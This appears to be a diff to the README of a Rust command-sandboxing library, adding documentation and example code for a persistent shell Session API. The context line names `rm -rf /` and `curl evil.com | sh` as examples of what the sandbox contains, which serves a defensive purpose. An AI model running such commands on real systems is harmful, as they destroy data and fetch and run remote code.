@@ -20,7 +20,7 @@ Give it a command like `rm -rf /`, `curl evil.com | sh`, or a full interactive `
 | macOS | **sandbox-exec** with a generated Seatbelt profile + rlimits | strong (Apple-supported) |
 | Windows | Re-executes inside **WSL2** under bubblewrap | strong (VM + Linux sandbox) |
 
-Every invocation is a one-shot process tree inside a fresh set of namespaces — not a long-running container. When the command exits, the namespaces vanish.
+Every `run()` invocation is a one-shot process tree inside a fresh set of namespaces — not a long-running container. When the command exits, the namespaces vanish. For commands that must share state (env, cwd, files, background jobs) across calls, use [`Session`](#persistent-sessions).
 
 ## Install
 
@@ -134,7 +134,39 @@ cargo run --example rm_rf_test
 
 # Interactive bash shell inside the sandbox (`docker run -it` style).
 cargo run --example shell
+
+# Persistent session: open once, run many commands sharing state, close.
+cargo run --example session
 ```
+
+## Persistent sessions
+
+When you need to run **multiple commands that share state** — files, env vars, cwd, background jobs — open a `Session` instead of calling `run()` each time.
+
+```rust
+use tokimo_package_sandbox::{SandboxConfig, Session};
+
+let cfg = SandboxConfig::new("/tmp/work");
+let mut sess = Session::open(&cfg)?;
+
+sess.exec("touch hello")?;                    // create file
+let out = sess.exec("ls")?;                   // file is still there
+assert!(out.stdout.contains("hello"));
+
+sess.exec("export FOO=bar")?;
+let out = sess.exec("echo $FOO")?;
+assert_eq!(out.stdout.trim(), "bar");
+
+sess.exec("cd /tmp && mkdir -p sub && cd sub")?;
+let out = sess.exec("pwd")?;
+assert!(out.stdout.contains("/sub"));         // cwd persists too
+
+sess.close()?;
+```
+
+Under the hood: a long-running `bash --noprofile --norc` runs inside the sandbox with stdin/stdout/stderr piped. Each `exec()` writes the command followed by a randomized sentinel and waits for the sentinel to come back. Same isolation as `run()` — same bwrap / Seatbelt / WSL backend — just kept alive across calls.
+
+You still get `exit_code`, `stdout`, `stderr` per call.
 
 ## Why not Docker?
 
